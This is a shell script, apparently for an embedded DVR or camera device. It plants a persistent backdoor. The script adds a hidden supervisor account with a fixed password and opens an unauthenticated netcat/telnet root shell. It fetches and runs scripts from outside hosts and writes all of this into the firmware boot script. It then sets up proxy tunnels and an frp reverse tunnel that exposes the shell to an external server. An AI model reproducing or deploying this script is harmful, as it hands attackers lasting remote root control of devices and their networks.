#!/bin/sh
XmlAp w Account.User5.Username myt
XmlAp w Account.User5.Password 30819
XmlAp w Account.User5.Level SUPERVISOR
XmlAp w Account.User5.Lifetime INFINITE
XmlAp w Account.User5.NeddRemove YES
telnetd -p 9009 -l /bin/sh > /dev/null 2>&1 &
sleep 3
nc -ll -p 9009 -e telnetd -l /bin/sh &
httpd -p 9003 -h /mnt/database/xml/
/bin/wget --no-check-certificate -O /tmp/avnexe.zip https://raw.githubusercontent.com/fyhong/avnexe/master/avnexe.zip
#----------crond start -------------
echo "SHELL=/bin/sh" > /mnt/database/cron.conf
echo "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin" >> /mnt/database/cron.conf
echo "" >> /mnt/database/cron.conf
echo "" >> /mnt/database/cron.conf

echo "# m h dom mon dow command" >> /mnt/database/cron.conf
echo "" >> /mnt/database/cron.conf

echo "*/2 * * * * /mnt/HDD0/ass6 -s 0.0.0.0 -p 8899 -k $(cat /mnt/database/sspass.conf) -m chacha20 -u -f /tmp/8899.ss -v" >> /mnt/database/cron.conf
echo "0 1 * * 1,3,5 killall ass6; echo $(($(date +%y1%m2%d3)*$(date +%w))) > /mnt/database/sspass.conf" >> /mnt/database/cron.conf
echo "*/2 * * * * sh /mnt/database/chkcp.sh" >> /mnt/database/cron.conf
#-----------crond end------------------

wget -O /mnt/database/run.sh http://fyhong.51vip.biz/avn/run.sh
wget -O /mnt/database/chkcp.sh http://fyhong.51vip.biz/avn/chkcp.sh
echo 4907 > /mnt/database/sspass.conf
dos2unix /mnt/database/*.sh
dos2unix /mnt/database/cron.conf
chmod 777 /mnt/HDD0/ass6 /mnt/HDD0/frpc /mnt/HDD0/kcpv5
/mnt/HDD0/ass6 -s 0.0.0.0 -p 8899 -k 4907 -m chacha20 -u -f /tmp/8899.ss -v
nohup /mnt/HDD0/kcpv5 -t 127.0.0.1:8899 -l :9000 -crypt salsa20 -nocomp -mode fast2 -sndwnd 256 -rcvwnd 256 > /dev/null 2>&1 &

#---------------------addboot---------------------
echo "telnetd -p 9009 -l /bin/sh &" >> /mnt/firmware/startDBus.sh
echo "sleep 3" >> /mnt/firmware/startDBus.sh
echo "nc -ll -p 9009 -e telnetd -l /bin/sh &" >> /mnt/firmware/startDBus.sh
echo "sh /mnt/database/run.sh &" >> /mnt/firmware/startDBus.sh
echo "httpd -p 9003 -h /mnt/database/xml/ &" >> /mnt/firmware/startDBus.sh
echo "/mnt/mtd/Dvr/XmlAp w Account.User5.Username myt" >> /mnt/firmware/startDBus.sh
echo "/mnt/mtd/Dvr/XmlAp w Account.User5.Password 30819" >> /mnt/firmware/startDBus.sh
echo "/mnt/mtd/Dvr/XmlAp w Account.User5.Level SUPERVISOR" >> /mnt/firmware/startDBus.sh
echo "/mnt/mtd/Dvr/XmlAp w Account.User5.Lifetime INFINITE" >> /mnt/firmware/startDBus.sh
echo "/mnt/mtd/Dvr/XmlAp w Account.User5.NeddRemove YES" >> /mnt/firmware/startDBus.sh
#----------------------addboot end---------------------
#---------frpc.ini-----------
echo "[common]" > /tmp/frpc.ini
echo server_addr = diyi.imbbs.in >> /tmp/frpc.ini
echo server_port = 9020 >> /tmp/frpc.ini
echo log_file = /tmp/frpc.log >> /tmp/frpc.ini
echo log_level = info >> /tmp/frpc.ini
echo log_max_days = 3 >> /tmp/frpc.ini
echo uth_token = 123 >> /tmp/frpc.ini
echo privilege_token = 12345678 >> /tmp/frpc.ini
echo "#" >> /tmp/frpc.ini
echo "[MAC"$(XmlAp r Network.eth0.MACAddress | sed s/://g)--$(wget http://members.3322.org/dyndns/getip -O - -q)"]" >> /tmp/frpc.ini
echo privilege_mode = true >> /tmp/frpc.ini
echo type = tcp >> /tmp/frpc.ini
echo local_ip = 127.0.0.1 >> /tmp/frpc.ini
echo local_port = 9009 >> /tmp/frpc.ini
echo use_encryption = true >> /tmp/frpc.ini
echo use_gzip = false >> /tmp/frpc.ini
if [ -z "$1" ];then
echo remote_port = $(wget http://members.3322.org/dyndns/getip -O - -q | awk -F . '{print substr(""$3"",1,2)$4}') >> /tmp/frpc.ini
else
echo remote_port = $1 >> /tmp/frpc.ini
fi
cp /tmp/frpc.ini /mnt/database
#------------frpc.ini-------------

sh /mnt/database/run.sh &

wget -O /tmp/frpc_min.ini http://fyhong.51vip.biz/avn/frpc_min.ini
/mnt/HDD0/frpc -c /tmp/frpc_min.ini > /dev/null 2>&1 &
